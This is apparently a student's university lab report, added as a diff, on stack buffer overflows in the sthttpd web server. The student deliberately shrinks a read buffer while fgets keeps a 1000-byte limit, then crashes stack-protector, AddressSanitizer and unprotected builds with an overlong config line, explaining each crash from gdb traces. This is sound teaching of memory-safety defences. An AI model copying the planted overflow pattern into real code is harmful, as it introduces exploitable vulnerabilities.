@@ -1,0 +1,662 @@
+Wenlong Xiong
+204407085
+
+Files included:
+smashinglab.txt
+thttp-sp.s
+thttp-as.s
+thttp-no.s
+exploit.txt
+config.txt
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		1) GCC Version
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	First, I logged onto the linux server by typing the following command into the shell, and entering my password:
+		ssh xiont@lnxsrv.seas.ucla.edu
+	I then entered the following command into shell, to edit my bash profile file and permantly change my GCC path version:
+		vim .bash_profile
+	In vim, I entered the following text:
+		export PATH=/usr/local/cs/bin:$PATH
+	Then saved and quit using the :x command in vim. I tested that this bash profile worked, by typing the following into shell:
+		which gcc
+	Which then returned:
+		$ /usr/local/cs/bin/gcc
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		2) Patching Source Code and Compiling Executables
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	Next, I downloaded and unzipped the sthttpd-2.27.0 file by typing the following into shell:
+		curl -O http://www.cs.ucla.edu/classes/spring15/cs33/lab/sthttpd-2.27.0.tar.gz
+		tar -xvf sthttpd-2.27.0.tar.gz
+	I navigated into the directory with the shell command:
+		cd sthttpd-2.27.0
+	I opened the file thttpd.c with the shell command:
+		vim src/thttpd.c
+	I then went to line 1002 and changed the line from:
+		char line[10000];
+	to
+		char line[100];
+	and also went to line 1015 and changed the line from:
+		while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
+	to
+		while ( fgets( line, 1000, fp ) != (char*) 0 )
+	I then saved and exited vim with the command :x.
+	I then typed the following into shell to set up the makefile:
+		./configure CFLAGS='-m32' LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+	Then, I compiled the sthttpd executable for the SP variant by typing the following into shell:
+		make clean
+		make CFLAGS='-m32 -g3 -O2 -fno-inline -fstack-protector-strong'
+		mv src/thttpd src/thttpd-sp
+	Then, I compiled the sthttpd executable for the AS variant by typing the following into shell:
+		make clean
+		make CFLAGS='-m32 -g3 -O2 -fno-inline -fsanitize=address'
+		mv src/thttpd src/thttpd-as
+	Then, I compiled the sthttpd executable for the NO variant by typing the following into shell:
+		make clean
+		make CFLAGS='-m32 -g3 -O2 -fno-inline'
+		mv src/thttpd src/thttpd-no
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		Config File for Steps 4, 5, 6
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	To crash our thttpd servers, we created a config file with a line that was longer than 100 characters - so that there would be a buffer overflow in the read_config function. To do this, I 
+typed in the following to shell:
+		vim config.txt
+	and in vim, entered the following line:
+		port=1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+	I then saved the file and exited vim by typing :x into vim.
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		3) Running Modified STHTTP Daemons
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	To run the modified STHTTP Daemons (SP, AS, NO respectively), I inputted the following commands into shell:
+		src/thttp-sp -p 12498
+		src/thttp-as -p 12499
+		src/thttp-no -p 12500
+	To close the running daemons, I inputted the following command into shell:
+		ps -u xiong
+	and found the PID of the daemon running, then used the following shell command:
+		kill -s 15 [PID]
+	to close the daemon, where the [PID] was replaced with the actual number found in the previous command.
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		4) Verifying Servers Work in Normal Case
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	To verify that the servers worked in the normal case, I first logged onto the server, and navigated to the directory sthttpd-2.27.0. I then ran the server by using the following shell command 
+(or the AS or NO equivalent)
+		src/thttp-sp -p 12498
+	Then used the following shell command to create a text file called foo in the current directory:
+		echo "some test" > foo.txt
+	I then verified that the server was running and did work by inputting the following command into shell:
+		curl http://localhost:12498/foo.txt
+	Which printed out:
+		some test
+	in the shell. I then repeated this for the AS and NO variants of the server, replacing the port number 12498 with their respective ports (12499 and 12500).
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		5) SP Variant Crash
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	To get the backtrace for the SP variant, I ran the thttpd-sp executable under gdb, by inputting the following into shell:
+		gdb --args src/thttpd-sp -p 12498 -D -C config.txt
+	Then, within gdb, I typed in the following commands to set breakpoints, display assembly code, and run the program:
+		break read_config
+		set disassemble-next-line on
+		run
+	Then, I used the following command
+		ni
+	to step forward (stepping over function calls) until the program crashed (resulted in a SEGFAULT). The resulting trace is:
+		0x0804b100 <read_config+0>:	55	push   %ebp
+		0x0804b101 <read_config+1>:	57	push   %edi
+		0x0804b102 <read_config+2>:	56	push   %esi
+		0x0804b103 <read_config+3>:	53	push   %ebx
+		0x0804b104 <read_config+4>:	89 c3	mov    %eax,%ebx
+		0x0804b106 <read_config+6>:	81 ec 94 00 00 00	sub    $0x94,%esp
+		0x0804b10c <read_config+12>:	65 a1 14 00 00 00	mov    %gs:0x14,%eax
+		0x0804b112 <read_config+18>:	89 84 24 84 00 00 00	mov    %eax,0x84(%esp)
+		0x0804b119 <read_config+25>:	31 c0	xor    %eax,%eax
+		0x0804b11b <read_config+27>:	68 49 5e 05 08	push   $0x8055e49
+		0x0804b120 <read_config+32>:	53	push   %ebx
+		0x0804b121 <read_config+33>:	e8 c2 e8 ff ff	call   0x80499e8 <fopen@plt>
+		0x0804b126 <read_config+38>:	89 44 24 1c	mov    %eax,0x1c(%esp)
+		0x0804b12a <read_config+42>:	83 c4 10	add    $0x10,%esp
+		0x0804b12d <read_config+45>:	85 c0	test   %eax,%eax
+		0x0804b12f <read_config+47>:	0f 84 50 05 00 00	je     0x804b685 <read_config+1413>
+		0x0804b135 <read_config+53>:	8d 7c 24 18	lea    0x18(%esp),%edi
+		0x0804b139 <read_config+57>:	83 ec 04	sub    $0x4,%esp
+		0x0804b13c <read_config+60>:	ff 74 24 10	pushl  0x10(%esp)
+		0x0804b140 <read_config+64>:	68 e8 03 00 00	push   $0x3e8
+		0x0804b145 <read_config+69>:	57	push   %edi
+		0x0804b146 <read_config+70>:	e8 fd e6 ff ff	call   0x8049848 <fgets@plt>
+		0x0804b14b <read_config+75>:	83 c4 10	add    $0x10,%esp
+		0x0804b14e <read_config+78>:	85 c0	test   %eax,%eax
+		0x0804b150 <read_config+80>:	0f 84 9e 04 00 00	je     0x804b5f4 <read_config+1268>
+		0x0804b156 <read_config+86>:	83 ec 08	sub    $0x8,%esp
+		0x0804b159 <read_config+89>:	6a 23	push   $0x23
+		0x0804b15b <read_config+91>:	57	push   %edi
+		0x0804b15c <read_config+92>:	e8 57 e6 ff ff	call   0x80497b8 <strchr@plt>
+		0x0804b161 <read_config+97>:	83 c4 10	add    $0x10,%esp
+		0x0804b164 <read_config+100>:	85 c0	test   %eax,%eax
+		0x0804b166 <read_config+102>:	74 03	je     0x804b16b <read_config+107>
+		0x0804b16b <read_config+107>:	83 ec 08	sub    $0x8,%esp
+		0x0804b16e <read_config+110>:	68 67 5d 05 08	push   $0x8055d67
+		0x0804b173 <read_config+115>:	57	push   %edi
+		0x0804b174 <read_config+116>:	e8 ef ea ff ff	call   0x8049c68 <strspn@plt>
+		0x0804b179 <read_config+121>:	8d 1c 07	lea    (%edi,%eax,1),%ebx
+		0x0804b17c <read_config+124>:	83 c4 10	add    $0x10,%esp
+		0x0804b17f <read_config+127>:	80 3b 00	cmpb   $0x0,(%ebx)
+		0x0804b182 <read_config+130>:	74 b5	je     0x804b139 <read_config+57>
+		0x0804b184 <read_config+132>:	8d 74 26 00	lea    0x0(%esi,%eiz,1),%esi
+		0x0804b188 <read_config+136>:	83 ec 08	sub    $0x8,%esp
+		0x0804b18b <read_config+139>:	68 67 5d 05 08	push   $0x8055d67
+		0x0804b190 <read_config+144>:	53	push   %ebx
+		0x0804b191 <read_config+145>:	e8 a2 eb ff ff	call   0x8049d38 <strcspn@plt>
+		0x0804b196 <read_config+150>:	83 c4 10	add    $0x10,%esp
+		0x0804b199 <read_config+153>:	8d 2c 03	lea    (%ebx,%eax,1),%ebp
+		0x0804b19c <read_config+156>:	eb 09	jmp    0x804b1a7 <read_config+167>
+		0x0804b19e <read_config+158>:	66 90	xchg   %ax,%ax
+		0x0804b1a7 <read_config+167>:	0f b6 45 00	movzbl 0x0(%ebp),%eax
+		0x0804b1ab <read_config+171>:	3c 0d	cmp    $0xd,%al
+		0x0804b1ad <read_config+173>:	0f 94 c1	sete   %cl
+		0x0804b1b0 <read_config+176>:	3c 20	cmp    $0x20,%al
+		0x0804b1b2 <read_config+178>:	0f 94 c2	sete   %dl
+		0x0804b1b5 <read_config+181>:	08 d1	or     %dl,%cl
+		0x0804b1b7 <read_config+183>:	75 e7	jne    0x804b1a0 <read_config+160>
+		0x0804b1b9 <read_config+185>:	83 e8 09	sub    $0x9,%eax
+		0x0804b1bc <read_config+188>:	3c 01	cmp    $0x1,%al
+		0x0804b1be <read_config+190>:	76 e0	jbe    0x804b1a0 <read_config+160>
+		0x0804b1a0 <read_config+160>:	83 c5 01	add    $0x1,%ebp
+		0x0804b1a3 <read_config+163>:	c6 45 ff 00	movb   $0x0,-0x1(%ebp)
+		0x0804b1a7 <read_config+167>:	0f b6 45 00	movzbl 0x0(%ebp),%eax
+		0x0804b1ab <read_config+171>:	3c 0d	cmp    $0xd,%al
+		0x0804b1ad <read_config+173>:	0f 94 c1	sete   %cl
+		0x0804b1b0 <read_config+176>:	3c 20	cmp    $0x20,%al
+		0x0804b1b2 <read_config+178>:	0f 94 c2	sete   %dl
+		0x0804b1b5 <read_config+181>:	08 d1	or     %dl,%cl
+		0x0804b1b7 <read_config+183>:	75 e7	jne    0x804b1a0 <read_config+160>
+		0x0804b1b9 <read_config+185>:	83 e8 09	sub    $0x9,%eax
+		0x0804b1bc <read_config+188>:	3c 01	cmp    $0x1,%al
+		0x0804b1be <read_config+190>:	76 e0	jbe    0x804b1a0 <read_config+160>
+		0x0804b1c0 <read_config+192>:	83 ec 08	sub    $0x8,%esp
+		0x0804b1c3 <read_config+195>:	6a 3d	push   $0x3d
+		0x0804b1c5 <read_config+197>:	53	push   %ebx
+		0x0804b1c6 <read_config+198>:	e8 ed e5 ff ff	call   0x80497b8 <strchr@plt>
+		0x0804b1cb <read_config+203>:	83 c4 10	add    $0x10,%esp
+		0x0804b1ce <read_config+206>:	85 c0	test   %eax,%eax
+		0x0804b1d0 <read_config+208>:	0f 84 1f 03 00 00	je     0x804b4f5 <read_config+1013>
+		0x0804b1d6 <read_config+214>:	8d 70 01	lea    0x1(%eax),%esi
+		0x0804b1d9 <read_config+217>:	c6 00 00	movb   $0x0,(%eax)
+		0x0804b1dc <read_config+220>:	83 ec 08	sub    $0x8,%esp
+		0x0804b1df <read_config+223>:	68 6c 5d 05 08	push   $0x8055d6c
+		0x0804b1e4 <read_config+228>:	53	push   %ebx
+		0x0804b1e5 <read_config+229>:	e8 ce e8 ff ff	call   0x8049ab8 <strcasecmp@plt>
+		0x0804b1ea <read_config+234>:	83 c4 10	add    $0x10,%esp
+		0x0804b1ed <read_config+237>:	85 c0	test   %eax,%eax
+		0x0804b1ef <read_config+239>:	0f 84 ce 02 00 00	je     0x804b4c3 <read_config+963>
+		0x0804b1f5 <read_config+245>:	83 ec 08	sub    $0x8,%esp
+		0x0804b1f8 <read_config+248>:	68 72 5d 05 08	push   $0x8055d72
+		0x0804b1fd <read_config+253>:	53	push   %ebx
+		0x0804b1fe <read_config+254>:	e8 b5 e8 ff ff	call   0x8049ab8 <strcasecmp@plt>
+		0x0804b203 <read_config+259>:	83 c4 10	add    $0x10,%esp
+		0x0804b206 <read_config+262>:	85 c0	test   %eax,%eax
+		0x0804b208 <read_config+264>:	0f 84 ca 02 00 00	je     0x804b4d8 <read_config+984>
+		0x0804b4d8 <read_config+984>:	89 f2	mov    %esi,%edx
+		0x0804b4da <read_config+986>:	89 d8	mov    %ebx,%eax
+		0x0804b4dc <read_config+988>:	e8 6f f9 ff ff	call   0x804ae50 <value_required>
+		0x0804b4e1 <read_config+993>:	83 ec 0c	sub    $0xc,%esp
+		0x0804b4e4 <read_config+996>:	56	push   %esi
+		0x0804b4e5 <read_config+997>:	e8 be e5 ff ff	call   0x8049aa8 <atoi@plt>
+		0x0804b4ea <read_config+1002>:	83 c4 10	add    $0x10,%esp
+		0x0804b4ed <read_config+1005>:	66 a3 f0 f7 05 08	mov    %ax,0x805f7f0
+		0x0804b4f3 <read_config+1011>:	eb ab	jmp    0x804b4a0 <read_config+928>
+		0x0804b4f5 <read_config+1013>:	31 f6	xor    %esi,%esi
+		0x0804b4f7 <read_config+1015>:	e9 e0 fc ff ff	jmp    0x804b1dc <read_config+220>
+		0x0804b4a0 <read_config+928>:	83 ec 08	sub    $0x8,%esp
+		0x0804b4a3 <read_config+931>:	68 67 5d 05 08	push   $0x8055d67
+		0x0804b4a8 <read_config+936>:	55	push   %ebp
+		0x0804b4a9 <read_config+937>:	e8 ba e7 ff ff	call   0x8049c68 <strspn@plt>
+		0x0804b4ae <read_config+942>:	8d 5c 05 00	lea    0x0(%ebp,%eax,1),%ebx
+		0x0804b4b2 <read_config+946>:	83 c4 10	add    $0x10,%esp
+		0x0804b4b5 <read_config+949>:	80 3b 00	cmpb   $0x0,(%ebx)
+		0x0804b4b8 <read_config+952>:	0f 85 ca fc ff ff	jne    0x804b188 <read_config+136>
+		0x0804b4be <read_config+958>:	e9 76 fc ff ff	jmp    0x804b139 <read_config+57>
+		0x0804b139 <read_config+57>:	83 ec 04	sub    $0x4,%esp
+		0x0804b13c <read_config+60>:	ff 74 24 10	pushl  0x10(%esp)
+		0x0804b140 <read_config+64>:	68 e8 03 00 00	push   $0x3e8
+		0x0804b145 <read_config+69>:	57	push   %edi
+		0x0804b146 <read_config+70>:	e8 fd e6 ff ff	call   0x8049848 <fgets@plt>
+		0x0804b14b <read_config+75>:	83 c4 10	add    $0x10,%esp
+		0x0804b14e <read_config+78>:	85 c0	test   %eax,%eax
+		0x0804b150 <read_config+80>:	0f 84 9e 04 00 00	je     0x804b5f4 <read_config+1268>
+		0x0804b5f4 <read_config+1268>:	83 ec 0c	sub    $0xc,%esp
+		0x0804b5f7 <read_config+1271>:	ff 74 24 18	pushl  0x18(%esp)
+		0x0804b5fb <read_config+1275>:	e8 a8 e3 ff ff	call   0x80499a8 <fclose@plst>
+		0x0804b600 <read_config+1280>:	83 c4 10	add    $0x10,%esp
+		0x0804b603 <read_config+1283>:	8b 44 24 7c	mov    0x7c(%esp),%eax
+		0x0804b607 <read_config+1287>:	65 33 05 14 00 00 00	xor    %gs:0x14,%eax
+		0x0804b60e <read_config+1294>:	0f 85 86 00 00 00	jne    0x804b69a <read_config+1434>
+		0x0804b69a <read_config+1434>:	e8 c9 e4 ff ff	call   0x8049b68 <__stack_chk_fail@plt>
+	The following line causes the program to crash:
+		0x0804b69a <read_config+1434>:	e8 c9 e4 ff ff	call   0x8049b68 <__stack_chk_fail@plt>
+	This is because in the previous code, a canary value (a random integer, but in this specific case, 0xdb2f8240) is stored on the stack, at esp + 0x84
+		0x0804b10c <read_config+12>:	65 a1 14 00 00 00	mov    %gs:0x14,%eax
+		0x0804b112 <read_config+18>:	89 84 24 84 00 00 00	mov    %eax,0x84(%esp)
+	The program allocates 148 bytes of memory on the stack with the following line:
+		0x0804b106 <read_config+6>:	81 ec 94 00 00 00	sub    $0x94,%esp
+	Then, in the following line, the function fgets is called:
+		0x0804b146 <read_config+70>:	e8 fd e6 ff ff	call   0x8049848 <fgets@plt>
+	The function reads characters from the buffer and stores them in a character array (on the stack). It reads characters until it hits a newline character, or reaches 1000 characters. In our 
+case, our config file has ~160 characters - this means we overwrite the character pointers, the canary value on the stack (esp + 0x7C), the arguments, and then the return address for the fgets 
+function. Because the canary value was overwritten, (previously, the value was 0xdb2f8240, but now holds 0x32333435) and the following comparison does not yield 0:
+		0x0804b603 <read_config+1283>:	8b 44 24 7c	mov    0x7c(%esp),%eax
+		0x0804b607 <read_config+1287>:	65 33 05 14 00 00 00	xor    %gs:0x14,%eax
+	As a result, the following command will cause a jump
+		0x0804b60e <read_config+1294>:	0f 85 86 00 00 00	jne    0x804b69a <read_config+1434>
+	A jump to the following function call
+		0x0804b69a <read_config+1434>:	e8 c9 e4 ff ff	call   0x8049b68 <__stack_chk_fail@plt>
+	This function call causes the program to crash. As a result, the program only crashes if the canary value that was stored on the stack is overwritten.
+	After the program crashed, the following backtrace was obtained by typing in the command:
+		backtrace
+	into gdb.
+		#0  x86_fallback_frame_state (context=0xffffb978, context=0xffffb978, fs=0xffffb9f8) at ./md-unwind-support.h:127
+		#1  uw_frame_state_for (context=context@entry=0xffffb978, fs=fs@entry=0xffffb9f8) at ../../../../gcc-4.9.2/libgcc/unwind-dw2.c:1253
+		#2  0x00158b20 in _Unwind_Backtrace (trace=0x2b8670 <backtrace_helper>, trace_argument=0xffffbad4) at ../../../../gcc-4.9.2/libgcc/unwind.inc:290
+		#3  0x002b8865 in backtrace () from /lib/libc.so.6
+		#4  0x0022974b in __libc_message () from /lib/libc.so.6
+		#5  0x002bbdad in __fortify_fail () from /lib/libc.so.6
+		#6  0x002bbd5a in __stack_chk_fail () from /lib/libc.so.6
+		#7  0x0804b69f in read_config (filename=<optimized out>) at thttpd.c:1190
+		#8  0x31313131 in ?? ()
+		#9  0x31313131 in ?? ()
+		#10 0x31313131 in ?? ()
+		#11 0x31313131 in ?? ()
+		#12 0x31313131 in ?? ()
+		#13 0x31313131 in ?? ()
+		#14 0x31313131 in ?? ()
+		#15 0x31313131 in ?? ()
+		#16 0xff000031 in ?? ()
+		#17 0xffffd424 in ?? ()
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		6) AS Variant Crash
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	To get the backtrace for the AS variant, I ran the thttpd-sp executable under gdb, by inputting the following into shell:
+		gdb --args src/thttpd-as -p 12499 -D -C config.txt
+	Then, within gdb, I typed in the following commands to set breakpoints, display assembly code, and run the program:
+		break read_config
+		set disassemble-next-line on
+		run
+	Then, I used the following command
+		ni
+	to step forward (stepping over function calls) until the program crashed (resulted in a SEGFAULT). The resulting trace is:
+		0x0804d9c0 <read_config+0>:   55 push   %ebp
+		0x0804d9c1 <read_config+1>:   57 push   %edi
+		0x0804d9c2 <read_config+2>:   56 push   %esi
+		0x0804d9c3 <read_config+3>:   53 push   %ebx
+		0x0804d9c4 <read_config+4>:   89 c3 mov    %eax,%ebx
+		0x0804d9c6 <read_config+6>:   81 ec dc 00 00 00 sub    $0xdc,%esp
+		0x0804d9cc <read_config+12>:  8d 44 24 10 lea    0x10(%esp),%eax
+		0x0804d9d0 <read_config+16>:  89 44 24 04 mov    %eax,0x4(%esp)
+		0x0804d9d4 <read_config+20>:  a1 40 90 08 08 mov    0x8089040,%eax
+		0x0804d9d9 <read_config+25>:  85 c0 test   %eax,%eax
+		0x0804d9db <read_config+27>:  0f 85 83 07 00 00 jne    0x804e164 <read_config+1956>
+		0x0804d9e1 <read_config+33>:  8b 74 24 04 mov    0x4(%esp),%esi
+		0x0804d9e5 <read_config+37>:  83 ec 08 sub    $0x8,%esp
+		0x0804d9e8 <read_config+40>:  89 f7 mov    %esi,%edi
+		0x0804d9ea <read_config+42>:  c7 06 b3 8a b5 41 movl   $0x41b58ab3,(%esi)
+		0x0804d9f0 <read_config+48>:  c7 46 04 fe bf 06 08 movl   $0x806bffe,0x4(%esi)
+		0x0804d9f7 <read_config+55>:  c1 ef 03 shr    $0x3,%edi
+		0x0804d9fa <read_config+58>:  c7 46 08 c0 d9 04 08 movl   $0x804d9c0,0x8(%esi)
+		0x0804da01 <read_config+65>:  c7 87 00 00 00 20 f1 f1 f1 f1 movl   $0xf1f1f1f1,0x20000000(%edi)
+		0x0804da0b <read_config+75>:  c7 87 10 00 00 20 04 f4 f4 f4 movl   $0xf4f4f404,0x20000010(%edi)
+		0x0804da15 <read_config+85>:  c7 87 14 00 00 20 f3 f3 f3 f3 movl   $0xf3f3f3f3,0x20000014(%edi)
+		0x0804da1f <read_config+95>:  68 a0 9e 06 08 push   $0x8069ea0
+		0x0804da24 <read_config+100>: 53 push   %ebx
+		0x0804da25 <read_config+101>: e8 fa c6 ff ff call   0x804a124 <fopen@plt>
+		0x0804da2a <read_config+106>: 89 44 24 1c mov    %eax,0x1c(%esp)
+		0x0804da2e <read_config+110>: 83 c4 10 add    $0x10,%esp
+		0x0804da31 <read_config+113>: 85 c0 test   %eax,%eax
+		0x0804da33 <read_config+115>: 0f 84 11 07 00 00 je     0x804e14a <read_config+1930>
+		0x0804da39 <read_config+121>: 89 f0 mov    %esi,%eax
+		0x0804da3b <read_config+123>: 83 c0 20 add    $0x20,%eax
+		0x0804da3e <read_config+126>: 89 44 24 08 mov    %eax,0x8(%esp)
+		0x0804da42 <read_config+130>: 83 ec 04 sub    $0x4,%esp
+		0x0804da45 <read_config+133>: ff 74 24 10 pushl  0x10(%esp)
+		0x0804da49 <read_config+137>: 68 e8 03 00 00 push   $0x3e8
+		0x0804da4e <read_config+142>: ff 74 24 14 pushl  0x14(%esp)
+		0x0804da52 <read_config+146>: e8 ad c4 ff ff call   0x8049f04 <fgets@plt>
+		0x0804da57 <read_config+151>: 83 c4 10 add    $0x10,%esp
+		0x0804da5a <read_config+154>: 85 c0 test   %eax,%eax
+		0x0804da5c <read_config+156>: 0f 84 f5 05 00 00 je     0x804e057 <read_config+1687>
+		0x0804da62 <read_config+162>: 83 ec 08 sub    $0x8,%esp
+		0x0804da65 <read_config+165>: 6a 23 push   $0x23
+		0x0804da67 <read_config+167>: ff 74 24 14 pushl  0x14(%esp)
+		0x0804da6b <read_config+171>: e8 14 ca ff ff call   0x804a484 <strchr@plt>
+		0x0804a484 <strchr@plt+0>: ff 25 4c 2d 08 08 jmp    *0x8082d4c
+		0x0804a48a <strchr@plt+6>: 68 00 04 00 00 push   $0x400
+		0x0804a48f <strchr@plt+11>:   e9 e0 f7 ff ff jmp    0x8049c74
+		0x08049c74: ff 35 44 2b 08 08 pushl  0x8082b44
+		0x08049c7a: ff 25 48 2b 08 08 jmp    *0x8082b48
+		0x00970d80 <_dl_runtime_resolve+0>: 50 push   %eax
+	The following line causes the program to crash:
+		0x0804da6b <read_config+171>: e8 14 ca ff ff call   0x804a484 <strchr@plt>
+	The enabling the -fsanitize=address option protects the stack by "poisoning" the memory around the memory region of interest. A "poisoned" memory region the shadow memory indicates that the 
+memory of interest is unaddressable. Shadow memory is memory that contains shadow values - it maps every 8 bytes of regular memory to 1 byte of shadow memory, by storing how many bytes of the aligned 
+memory are unaddressable. For example, a 4 byte int in an 8-byte aligne chunk of memory would result in a single shadow byte that has the value 4, for 4 bytes of unaddressable memory. In the program, 
+before any dynamic memory allocation occurs, the application poisons memory immediately before and after the application memory, and maps these poisoned/unpoisoned (part of the application memory is 
+unpoisoned) memory regions to the shadow memory region. Every time we attempt to access application memory, we check with the shadow memory to make sure that the addressable/unaddressable regions 
+match up. If a buffer overflow occured, the poisoned memory is overwritten with addressable memory, so the check with the shadow memory will return an error.
+	[_poisoned_memory____]
+	[_application_memory_]
+	[_poisoned_memory____]
+	[_shadow_memory______]
+	In the function call fgets, a buffer overflow occurred, and parts of the stack that were originally unaddressable are now addressable. As a result, in the function call to <strchr@plt>, the 
+program attempted to access parts of the stack that were overwritten, and the check with the shadow bytes failed. As a result, the program crashed.
+	After the program crashed, the following backtrace was printed out:
+		#0 0x13ded0 in __interceptor_strchr ../../../../../gcc-4.9.2/libsanitizer/asan/asan_interceptors.cc:417
+	    #1 0x804da6f in read_config /u/cs/ugrad/xiong/sthttpd-2.27.0/src/thttpd.c:1018
+	    #2 0x804e603 in parse_args /u/cs/ugrad/xiong/sthttpd-2.27.0/src/thttpd.c:893
+	    #3 0x80530a1 in main /u/cs/ugrad/xiong/sthttpd-2.27.0/src/thttpd.c:380
+	    #4 0x994d35 in __libc_start_main (/lib/libc.so.6+0x994d35)
+	    #5 0x804cb28 (/w/home.01/cs/ugrad/xiong/sthttpd-2.27.0/src/thttpd-as+0x804cb28)
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+//		7) NO Variant Crash
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+	To get the backtrace for the NO variant, I ran the thttpd-sp executable under gdb, by inputting the following into shell:
+		gdb --args src/thttpd-NO -p 12500 -D -C config.txt
+	Then, within gdb, I typed in the following commands to set breakpoints, display assembly code, and run the program:
+		break read_config
+		set disassemble-next-line on
+		run
+	Then, I used the following command
+		ni
+	to step forward (stepping over function calls) until the program crashed (resulted in a SEGFAULT). The resulting trace is:
+		0x0804afc0 <read_config+0>:  55  push   %ebp
+		0x0804afc1 <read_config+1>:  57  push   %edi
+		0x0804afc2 <read_config+2>:  56  push   %esi
+		0x0804afc3 <read_config+3>:  53  push   %ebx
+		0x0804afc4 <read_config+4>:  89 c3 mov    %eax,%ebx
+		0x0804afc6 <read_config+6>:  81 ec 94 00 00 00 sub    $0x94,%esp
+		0x0804afcc <read_config+12>: 68 49 59 05 08  push   $0x8055949
+		0x0804afd1 <read_config+17>: 50  push   %eax
+		0x0804afd2 <read_config+18>: e8 c5 e9 ff ff  call   0x804999c <fopen@plt>
+		0x0804afd7 <read_config+23>: 89 44 24 1c mov    %eax,0x1c(%esp)
+		0x0804afdb <read_config+27>: 83 c4 10  add    $0x10,%esp
+		0x0804afde <read_config+30>: 85 c0 test   %eax,%eax
+		0x0804afe0 <read_config+32>: 0f 84 21 05 00 00 je     0x804b507 <read_config+1351>
+		0x0804afe6 <read_config+38>: 8d 7c 24 1c lea    0x1c(%esp),%edi
+		0x0804afea <read_config+42>: 83 ec 04  sub    $0x4,%esp
+		0x0804afed <read_config+45>: ff 74 24 10 pushl  0x10(%esp)
+		0x0804aff1 <read_config+49>: 68 e8 03 00 00  push   $0x3e8
+		0x0804aff6 <read_config+54>: 57  push   %edi
+		0x0804aff7 <read_config+55>: e8 00 e8 ff ff  call   0x80497fc <fgets@plt>
+		0x0804affc <read_config+60>: 83 c4 10  add    $0x10,%esp
+		0x0804afff <read_config+63>: 85 c0 test   %eax,%eax
+		0x0804b001 <read_config+65>: 0f 84 9d 04 00 00 je     0x804b4a4 <read_config+1252>
+		0x0804b007 <read_config+71>: 83 ec 08  sub    $0x8,%esp
+		0x0804b00a <read_config+74>: 6a 23 push   $0x23
+		0x0804b00c <read_config+76>: 57  push   %edi
+		0x0804b00d <read_config+77>: e8 5a e7 ff ff  call   0x804976c <strchr@plt>
+		0x0804b012 <read_config+82>: 83 c4 10  add    $0x10,%esp
+		0x0804b015 <read_config+85>: 85 c0 test   %eax,%eax
+		0x0804b017 <read_config+87>: 74 03 je     0x804b01c <read_config+92>
+		0x0804b01c <read_config+92>: 83 ec 08  sub    $0x8,%esp
+		0x0804b01f <read_config+95>: 68 67 58 05 08  push   $0x8055867
+		0x0804b024 <read_config+100>:  57  push   %edi
+		0x0804b025 <read_config+101>:  e8 e2 eb ff ff  call   0x8049c0c <strspn@plt>
+		0x0804b02a <read_config+106>:  8d 1c 07  lea    (%edi,%eax,1),%ebx
+		0x0804b02d <read_config+109>:  83 c4 10  add    $0x10,%esp
+		0x0804b030 <read_config+112>:  80 3b 00  cmpb   $0x0,(%ebx)
+		0x0804b033 <read_config+115>:  74 b5 je     0x804afea <read_config+42>
+		0x0804b035 <read_config+117>:  8d 76 00  lea    0x0(%esi),%esi
+		0x0804b038 <read_config+120>:  83 ec 08  sub    $0x8,%esp
+		0x0804b03b <read_config+123>:  68 67 58 05 08  push   $0x8055867
+		0x0804b040 <read_config+128>:  53  push   %ebx
+		0x0804b041 <read_config+129>:  e8 96 ec ff ff  call   0x8049cdc <strcspn@plt>
+		0x0804b046 <read_config+134>:  83 c4 10  add    $0x10,%esp
+		0x0804b049 <read_config+137>:  8d 2c 03  lea    (%ebx,%eax,1),%ebp
+		0x0804b04c <read_config+140>:  eb 09 jmp    0x804b057 <read_config+151>
+		0x0804b057 <read_config+151>:  0f b6 45 00 movzbl 0x0(%ebp),%eax
+		0x0804b05b <read_config+155>:  3c 0d cmp    $0xd,%al
+		0x0804b05d <read_config+157>:  0f 94 c1  sete   %cl
+		0x0804b060 <read_config+160>:  3c 20 cmp    $0x20,%al
+		0x0804b062 <read_config+162>:  0f 94 c2  sete   %dl
+		0x0804b065 <read_config+165>:  08 d1 or     %dl,%cl
+		0x0804b067 <read_config+167>:  75 e7 jne    0x804b050 <read_config+144>
+		0x0804b069 <read_config+169>:  83 e8 09  sub    $0x9,%eax
+		0x0804b06c <read_config+172>:  3c 01 cmp    $0x1,%al
+		0x0804b06e <read_config+174>:  76 e0 jbe    0x804b050 <read_config+144>
+		0x0804b050 <read_config+144>:  83 c5 01  add    $0x1,%ebp
+		0x0804b053 <read_config+147>:  c6 45 ff 00 movb   $0x0,-0x1(%ebp)
+		0x0804b057 <read_config+151>:  0f b6 45 00 movzbl 0x0(%ebp),%eax
+		0x0804b05b <read_config+155>:  3c 0d cmp    $0xd,%al
+		0x0804b05d <read_config+157>:  0f 94 c1  sete   %cl
+		0x0804b060 <read_config+160>:  3c 20 cmp    $0x20,%al
+		0x0804b062 <read_config+162>:  0f 94 c2  sete   %dl
+		0x0804b065 <read_config+165>:  08 d1 or     %dl,%cl
+		0x0804b067 <read_config+167>:  75 e7 jne    0x804b050 <read_config+144>
+		0x0804b069 <read_config+169>:  83 e8 09  sub    $0x9,%eax
+		0x0804b06c <read_config+172>:  3c 01 cmp    $0x1,%al
+		0x0804b06e <read_config+174>:  76 e0 jbe    0x804b050 <read_config+144>
+		0x0804b070 <read_config+176>:  83 ec 08  sub    $0x8,%esp
+		0x0804b073 <read_config+179>:  6a 3d push   $0x3d
